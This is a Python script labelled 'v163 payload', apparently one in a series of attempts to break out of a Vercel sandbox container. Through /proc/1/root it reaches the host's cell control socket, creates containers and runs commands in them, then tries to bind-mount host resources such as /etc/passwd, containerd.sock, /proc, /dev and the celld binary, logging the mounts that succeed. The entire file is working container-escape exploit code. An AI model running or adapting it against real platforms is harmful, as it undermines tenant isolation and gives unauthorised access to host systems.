# -*- coding: utf-8 -*-
"""v163 payload: Exec 容器内命令验证 + StreamOutput 读输出 + Mount source/destination 探索
输出 /vercel/sandbox/v163c.out"""
import socket, struct, time, json, os, signal, re, ctypes

OUT = '/vercel/sandbox/v163c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(280)

R = '/proc/1/root'
CELL = R + '/run/cell/cell.sock'
CTRS = '/vercel.hive.cell.api.containers.v1.ContainersService'


def log(s, maxlen=400):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC %d]' % len(s)
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def raw_req(sockpath, path, body, t=5.0, ctype='application/json'):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, ctype, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        return st, d[hdr_end + 4:hdr_end + 4 + 1000] if hdr_end > 0 else b''
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


def raw_grpc_stream(sockpath, path, msg, t=6.0, wait=3.0):
    """gRPC 流式读取 (StreamOutput): 发送后保持连接读取"""
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        body = b'\x00' + struct.pack('>I', len(msg)) + msg
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/grpc\r\n'
               'TE: trailers\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, len(body))).encode() + body
        s.sendall(req)
        d = b''
        t0 = time.time()
        try:
            while time.time() - t0 < wait:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        gs = re.search(rb'grpc-status: (\d+)', d)
        return st, d[hdr_end + 4:] if hdr_end > 0 else b'', gs.group(1).decode() if gs else ''
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b'', ''


def fstr(field_no, s):
    return bytes([field_no << 3 | 2]) + bytes([len(s)]) + s.encode()


def fmsg(field_no, inner):
    return bytes([field_no << 3 | 2]) + bytes([len(inner)]) + inner


def fvarint(field_no, v):
    out = bytes([field_no << 3])
    while v >= 128:
        out += bytes([(v & 127) | 128])
        v >>= 7
    return out + bytes([v])


def exec_cmd(cid, cmd_str, tag, t=8):
    body = json.dumps({'container_id': cid,
                       'process': {'command': '/bin/sh', 'arguments': ['-c', cmd_str]}}).encode()
    st, pay = raw_req(CELL, '%s/Exec' % CTRS, body, t=t)
    log('%s Exec -> %s %r' % (tag, st, pay[:200]))
    return pay


# ============ 1: Create + Start ============
log('=== 1 create ===')
st, pay = raw_req(CELL, '%s/Create' % CTRS,
                  json.dumps({'drive_id': 'sandbox', 'command': 'sleep'}).encode(), t=8)
log('Create sleep -> %s %r' % (st, pay[:200]))
m = re.search(rb'containerId["\s:]+([A-Za-z0-9_-]+)', pay)
cid = m.group(1).decode() if m else ''
log('cid=%s' % cid)
st2, pay2 = raw_req(CELL, '%s/Start' % CTRS, json.dumps({'container_id': cid}).encode(), t=8)
log('Start -> %s %r' % (st2, pay2[:200]))
time.sleep(0.5)

# ============ 2: Exec 写文件 (容器 rootfs 多位置) ============
log('=== 2 exec write ===')
if cid:
    cmd = ('echo ROOTFS_MARKER > /tmp/v163m; echo ROOTFS_MARKER > /root/v163m; echo ROOTFS_MARKER > /etc/v163m; '
           'echo ROOTFS_MARKER > /mnt/v163m; echo ROOTFS_MARKER > /var/tmp/v163m; '
           'echo PWD=$(pwd) > /tmp/v163pwd; ls -la / > /tmp/v163ls; '
           'sleep 120')
    exec_cmd(cid, cmd, 'write')
    time.sleep(1.5)
    # 沙箱视角检查 (容器 rootfs 若=drive 可见)
    for p in ['/tmp/v163m', '/root/v163m', '/etc/v163m', '/mnt/v163m', '/var/tmp/v163m',
              '/tmp/v163pwd', '/tmp/v163ls']:
        try:
            d = open(p).read()
            log('SBX %s=%r' % (p, d[:200]))
        except Exception as e:
            log('SBX %s ERR' % p)

# ============ 3: Exec 输出 + StreamOutput ============
log('=== 3 output ===')
if cid:
    exec_cmd(cid, 'echo OUT_MARKER_STDOUT; echo OUT_MARKER_STDERR >&2; sleep 90', 'out')
    time.sleep(0.5)
    # StreamOutput 各 stream 值
    for sv in [0, 1, 2]:
        req = fstr(1, cid) + fvarint(2, sv)
        st3, pay3, gs3 = raw_grpc_stream(CELL, '%s/StreamOutput' % CTRS, req, wait=2.0)
        log('StreamOutput s=%d -> %s gs=%s body=%r' % (sv, st3, gs3, pay3[:400]))

# ============ 4: Mount destination 探索 ============
log('=== 4 mount dst ===')
if cid:
    for dst in ['/tmp/x', '/root/x', '/etc/x', '/run/x', '/var/tmp/x', '/mnt/drives/sandbox/x',
                '/tmp', '/root', '/etc', '/run', '/', '/dev/shm/x', '/tmp/../x']:
        st4, pay4 = raw_req(CELL, '%s/Mount' % CTRS,
                            json.dumps({'container_id': cid,
                                        'mounts': [{'bind': {'source': '/tmp', 'destination': dst,
                                                             'mode': 'MOUNT_MODE_READ_WRITE'}}]}).encode(), t=5)
        mm = re.search(rb'"message":"([^"]+)"', pay4)
        msg = mm.group(1).decode(errors='replace') if mm else pay4[:120].decode(errors='replace')
        log('Mount dst=%r -> %s %s' % (dst, st4, msg))

# ============ 5: Mount source 任意性 (destination 用合法的) ============
log('=== 5 mount src ===')
if cid:
    for src in ['/tmp', '/proc/1/root/etc/passwd', '/run/containerd/containerd.sock',
                '/sys/fs/cgroup', '/proc', '/dev', '/etc', '/vercel/sandbox',
                '/proc/1/root/opt/vercel/celld']:
        st5, pay5 = raw_req(CELL, '%s/Mount' % CTRS,
                            json.dumps({'container_id': cid,
                                        'mounts': [{'bind': {'source': src, 'destination': '/tmp/v163mnt',
                                                             'mode': 'MOUNT_MODE_READ_WRITE'}}]}).encode(), t=5)
        mm = re.search(rb'"message":"([^"]+)"', pay5)
        msg = mm.group(1).decode(errors='replace') if mm else pay5[:120].decode(errors='replace')
        log('Mount src=%r -> %s %s' % (src, st5, msg))
        if '200' in st5:
            log('  MOUNT OK! src=%r' % src)

# ============ 6: MountTypeDrive / Tmpfs 测试 ============
log('=== 6 other types ===')
if cid:
    for mnt in [{'drive': {'drive_id': 'sandbox', 'mount_path': '/tmp/v163drv', 'mode': 'MOUNT_MODE_READ_WRITE'}},
                {'drive': {'driveId': 'sandbox', 'mountPath': '/tmp/v163drv', 'mode': 'MOUNT_MODE_READ_WRITE'}},
                {'tmpfs': {'mode': 'MOUNT_MODE_READ_WRITE'}},
                {'tmpfs': {}}]:
        st6, pay6 = raw_req(CELL, '%s/Mount' % CTRS,
                            json.dumps({'container_id': cid, 'mounts': [mnt]}).encode(), t=5)
        mm = re.search(rb'"message":"([^"]+)"', pay6)
        msg = mm.group(1).decode(errors='replace') if mm else pay6[:150].decode(errors='replace')
        log('Mount %r -> %s %s' % (mnt, st6, msg))
        if '200' in st6:
            log('  OK! %r' % mnt)

# ============ 7: 检查挂载后容器视角 ============
log('=== 7 post mount ===')
if cid:
    exec_cmd(cid, 'ls -la /tmp/ | head -30; echo ---; cat /tmp/v163mnt 2>&1 | head -5', 'post')
    time.sleep(0.8)

log('V163_DONE')
f.close()
